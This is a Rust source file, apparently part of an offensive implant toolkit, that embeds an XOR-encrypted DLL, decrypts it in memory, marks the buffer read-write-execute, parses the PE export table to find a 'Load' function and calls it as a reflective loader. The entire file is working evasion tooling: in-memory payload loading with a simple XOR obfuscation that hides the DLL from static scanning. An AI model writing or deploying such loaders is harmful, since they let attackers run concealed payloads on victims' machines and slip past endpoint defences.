use core::{
    ffi::{CStr, c_void},
    mem::transmute,
    ptr::{copy_nonoverlapping, null_mut, read_unaligned},
};

use windows_sys::Win32::System::{
    Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
    Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAlloc,
        VirtualProtect,
    },
    SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
};

const DLL_BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/rdll_encrypted.bin"));
const ENCRYPTION_KEY: u8 = 0x90;

/// Inject the rDLL into our **current** process
pub fn inject_current_process() {
    unsafe {
        //
        // Allocate the encrypted PE and decrypt in place
        //
        let p_decrypt = VirtualAlloc(
            null_mut(),
            DLL_BYTES.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if p_decrypt.is_null() {
            return;
        }

        // Copy the bytes into it
        copy_nonoverlapping(DLL_BYTES.as_ptr(), p_decrypt as _, DLL_BYTES.len());

        // Decrypt the memory
        for i in 0..DLL_BYTES.len() as usize {
            let b = (p_decrypt as *mut u8).add(i);
            *b ^= ENCRYPTION_KEY;
        }

        //
        // Now operate on the decrypted PE
        //

        let dos = read_unaligned(p_decrypt as *const IMAGE_DOS_HEADER);
        let mapped_nt_ptr = (p_decrypt as usize + dos.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

        //
        // Find the 'Load' export and call the reflective loader (which exists in `Load``)
        //
        if let Some(load_fn) = find_export_address(p_decrypt as _, mapped_nt_ptr, "Load") {
            let mut old_protect = 0;
            let _ = VirtualProtect(
                p_decrypt,
                DLL_BYTES.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );
            let reflective_load: unsafe extern "system" fn(*mut c_void) -> u32 = transmute(load_fn);

            // Call the export and hope for the best! :D
            reflective_load(p_decrypt);
        }
    }
}

#[inline(always)]
fn find_export_address(
    file_base: *mut u8,
    nt: *mut IMAGE_NT_HEADERS64,
    name: &str,
) -> Option<unsafe extern "system" fn()> {
    unsafe {
        let dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize];
        if dir.VirtualAddress == 0 || dir.Size == 0 {
            return None;
        }

        let exp_dir: *mut IMAGE_EXPORT_DIRECTORY = rva_from_file(file_base, nt, dir.VirtualAddress);

        if exp_dir.is_null() {
            return None;
        }

        let exp = read_unaligned(exp_dir);

        let names: *const u32 = rva_from_file(file_base, nt, exp.AddressOfNames);
        let funcs: *const u32 = rva_from_file(file_base, nt, exp.AddressOfFunctions);
        let ords: *const u16 = rva_from_file(file_base, nt, exp.AddressOfNameOrdinals);

        if names.is_null() || funcs.is_null() || ords.is_null() {
            return None;
        }

        for i in 0..exp.NumberOfNames {
            let name_rva = read_unaligned(names.add(i as usize));
            let name_ptr = rva_from_file::<u8>(file_base, nt, name_rva);

            if name_ptr.is_null() {
                continue;
            }

            let export_name = CStr::from_ptr(name_ptr as *const i8).to_str().ok();
            if export_name == Some(name) {
                let ord_index = read_unaligned(ords.add(i as usize)) as usize;
                let func_rva = read_unaligned(funcs.add(ord_index)) as u32;
                let func_ptr = rva_from_file::<u8>(file_base, nt, func_rva) as usize;

                return Some(transmute::<usize, unsafe extern "system" fn()>(func_ptr));
            }
        }

        None
    }
}

/// Convert an RVA from the PE into a pointer inside a buffer which came from a file - NOT correctly mapped / relocated memory.
unsafe fn rva_from_file<T>(
    file_base: *const u8,
    nt: *const IMAGE_NT_HEADERS64,
    rva: u32,
) -> *mut T {
    let num_sections = unsafe { *nt }.FileHeader.NumberOfSections as usize;

    let first_section = unsafe { (nt as *const u8).add(size_of::<IMAGE_NT_HEADERS64>()) }
        as *const IMAGE_SECTION_HEADER;

    for i in 0..num_sections {
        let sec = unsafe { &*first_section.add(i) };

        let va = sec.VirtualAddress;
        let raw = sec.PointerToRawData;
        let size = if sec.SizeOfRawData != 0 {
            sec.SizeOfRawData
        } else {
            unsafe { sec.Misc.VirtualSize }
        };

        if rva >= va && rva < va + size {
            let delta = rva - va;
            let file_off = raw + delta;
            return unsafe { file_base.add(file_off as usize) } as *mut T;
        }
    }

    null_mut()
}
